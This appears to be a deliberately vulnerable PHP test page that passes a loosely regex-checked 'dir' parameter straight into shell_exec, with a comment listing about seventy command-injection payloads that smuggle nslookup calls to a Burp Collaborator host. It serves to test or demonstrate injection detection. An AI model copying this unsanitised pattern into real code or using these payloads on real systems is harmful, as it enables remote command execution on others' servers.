<?php
# filename: lax_domain_name.php
# vulnerable as the regex is too lose
# sample successful payloads:
/*
a.a.com%7C%24%28nslookup+1016.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%7Ca.a.com
a.a.com%26%24%28nslookup%24IFS%249a1259.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%26a.a.com
a.a.com%7Cnslookup%24IFS%249a1232.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%7Ca.a.com
a.a.com%22%26%24%28nslookup+1013.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%26%22a.a.com
a.a.com%60nslookup%24IFS%249a1367.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60a.a.com
a.a.com%7C%60nslookup%091196.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%7Ca.a.com
a.a.com%22%24%28nslookup%091346.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%22a.a.com
a.a.com";$(nslookup$IFS$9a1282.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net);"a.a.com
a.a.com%26nslookup%24IFS%249a1223.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%26a.a.com
a.a.com`nslookup$IFS$9a1366.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net`a.a.com
a.a.com%7Cnslookup+980.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%7Ca.a.com
a.a.com%26nslookup%091115.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%26a.a.com
a.a.com%3B%24%28nslookup+1025.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%3Ba.a.com
a.a.com"|$(nslookup$IFS$9a1273.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net)|"a.a.com
a.a.com%3Bnslookup+989.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%3Ba.a.com
a.a.com%3B%24%28nslookup%091169.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%3Ba.a.com
a.a.com%3B%24%28nslookup%24IFS%249a1277.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%3Ba.a.com
a.a.com%22%60nslookup%091355.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%22a.a.com
a.a.com;nslookup$IFS$9a1240.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net;a.a.com
a.a.com%22%24%28nslookup+1328.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%22a.a.com
a.a.com"|`nslookup$IFS$9a1309.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net`|"a.a.com
a.a.com%60nslookup+1331.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60a.a.com
a.a.com%22%3B%24%28nslookup+1031.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%3B%22a.a.com
a.a.com%3Bnslookup%24IFS%249a1241.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%3Ba.a.com
a.a.com%22%7C%60nslookup+1058.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%7C%22a.a.com
a.a.com%60nslookup%091349.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60a.a.com
a.a.com%7Cnslookup%091124.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%7Ca.a.com
a.a.com%22%7C%60nslookup%24IFS%249a1310.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%7C%22a.a.com
a.a.com%22%3B%24%28nslookup%24IFS%249a1283.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%3B%22a.a.com
a.a.com%22%3B%60nslookup+1067.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%3B%22a.a.com
a.a.com%7C%24%28nslookup%091160.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%7Ca.a.com
a.a.com%3Bnslookup%091133.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%3Ba.a.com
a.a.com%22%26%60nslookup+1049.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%26%22a.a.com
a.a.com%22%60nslookup%24IFS%249a1373.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%22a.a.com
a.a.com%26%24%28nslookup+1007.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%26a.a.com
a.a.com%22%3B%24%28nslookup%091175.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%3B%22a.a.com
a.a.com%22%26%24%28nslookup%24IFS%249a1265.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%26%22a.a.com
a.a.com%3B%60nslookup%24IFS%249a1313.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%3Ba.a.com
a.a.com%22%60nslookup+1337.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%22a.a.com
a.a.com%24%28nslookup%24IFS%249a1358.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29a.a.com
a.a.com%26%60nslookup%24IFS%249a1295.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%26a.a.com
a.a.com%24%28nslookup+1322.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29a.a.com
a.a.com%7C%24%28nslookup%24IFS%249a1268.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%7Ca.a.com
a.a.com;`nslookup$IFS$9a1312.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net`;a.a.com
a.a.com%22%7C%60nslookup%091202.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%7C%22a.a.com
a.a.com%22%7C%24%28nslookup%091166.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%7C%22a.a.com
a.a.com%22%3B%60nslookup%091211.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%3B%22a.a.com
a.a.com%22%26%60nslookup%24IFS%249a1301.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%26%22a.a.com
a.a.com%22%3B%60nslookup%24IFS%249a1319.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%3B%22a.a.com
a.a.com";`nslookup$IFS$9a1318.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net`;"a.a.com
a.a.com%22%26%60nslookup%091193.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%26%22a.a.com
a.a.com%26nslookup+971.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%26a.a.com
a.a.com%7C%60nslookup+1052.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%7Ca.a.com
a.a.com%22%7C%24%28nslookup%24IFS%249a1274.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%7C%22a.a.com
a.a.com%22%26%24%28nslookup%091157.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%26%22a.a.com
a.a.com%26%24%28nslookup%091151.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%26a.a.com
a.a.com%22%7C%24%28nslookup+1022.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%7C%22a.a.com
a.a.com%7C%60nslookup%24IFS%249a1304.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%7Ca.a.com
a.a.com%26%60nslookup%091187.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%26a.a.com
a.a.com|$(nslookup$IFS$9a1267.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net)|a.a.com
a.a.com|`nslookup$IFS$9a1303.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net`|a.a.com
a.a.com%26%60nslookup+1043.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%26a.a.com
a.a.com"$(nslookup$IFS$9a1363.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net)"a.a.com
a.a.com;$(nslookup$IFS$9a1276.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net);a.a.com
a.a.com$(nslookup$IFS$9a1357.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net)a.a.com
a.a.com|nslookup$IFS$9a1231.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net|a.a.com
a.a.com%3B%60nslookup%091205.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%3Ba.a.com
a.a.com"`nslookup$IFS$9a1372.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net`"a.a.com
a.a.com%3B%60nslookup+1061.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%60%3Ba.a.com
a.a.com%22%24%28nslookup%24IFS%249a1364.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29%22a.a.com
a.a.com%24%28nslookup%091340.m5sousiknr1cxm67t690qyx66xcp0e.burpcollaborator.net%29a.a.com

*/

if(isset($_GET['dir'])&&preg_match('/^\w+\..*\w+\.\w+$/',$_GET['dir']))
{
	 echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
}
?>

<a href="?dir=a.a.com">clickme</a>
